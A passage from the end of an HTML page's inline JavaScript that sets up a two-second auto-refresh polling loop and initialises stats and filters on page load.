        function startPolling() {
            clearInterval(refreshTimer);
            refreshTimer = setInterval(() => {
                if (autoRefreshActive) {
                    refreshData(false);
                }
            }, 2000);
        }

        // Initialize on load
        updateStats();
        applyFilter();
        startPolling();
    </script>
</body>

</html>
